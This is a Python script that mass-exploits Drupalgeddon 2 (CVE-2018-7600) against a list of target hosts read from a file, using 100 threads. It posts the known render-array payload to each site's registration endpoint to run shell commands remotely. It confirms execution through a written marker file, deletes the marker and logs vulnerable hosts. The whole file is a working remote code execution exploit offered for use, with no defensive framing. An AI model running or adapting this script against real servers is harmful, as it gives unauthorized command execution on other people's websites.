import requests
import threading
from queue import Queue

def attack(i):
    while not q.empty():
        try:
            target = 'http://{}'.format(q.get())
            commands = 'echo "test:)" | tee index1.txt'   # index1.txt文件
            url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
            # print(url)
            payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': '{}'.format(commands)}
            requests.post(url=url, data=payload, timeout=15)
            index1_url = target + '/index1.txt'
            # print("当前index1_url为:{}".format(index1_url))
            res = requests.get(url=index1_url, timeout=20)
            # print(res)

            if 'test:)' in res.text and res.status_code == 200:
                print('[+][SSS][{}] 存在Drupal geddon 2 远程代码执行漏洞(CVE-2018-7600)'.format(target))
                commands = 'rm index1.txt'
                payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                           'mail[#type]': 'markup', 'mail[#markup]': '{}'.format(commands)}
                requests.post(url, data=payload, timeout=15)
                print('[+] [{}] 删除测试文件index1.txt'.format(target))
                with open(r'E:\PythonWorkB\PythonDay09\Drupal\success.txt', 'at') as f:
                    f.write(target+'\n')
            else:
                print('[{}][-] [{}] 不存在Drupal geddon 2 远程代码执行漏洞(CVE-2018-7600)'.format(i,target))
        except Exception as e:
            print("[{}] ".format(i) + target + "====>连接超时")
if __name__ == "__main__":
    threads = []
    NUM = 100
    q = Queue(-1)
    with open(r'E:\PythonWorkB\PythonDay09\Drupal\us.txt', 'rt') as f:
        for each in f.readlines():
            q.put(each.strip())
    for i in range(NUM):
        t = threading.Thread(target=attack, args=(i,))
        threads.append(t)   #线程列表
        t.start()
    for t in threads:
        t.join()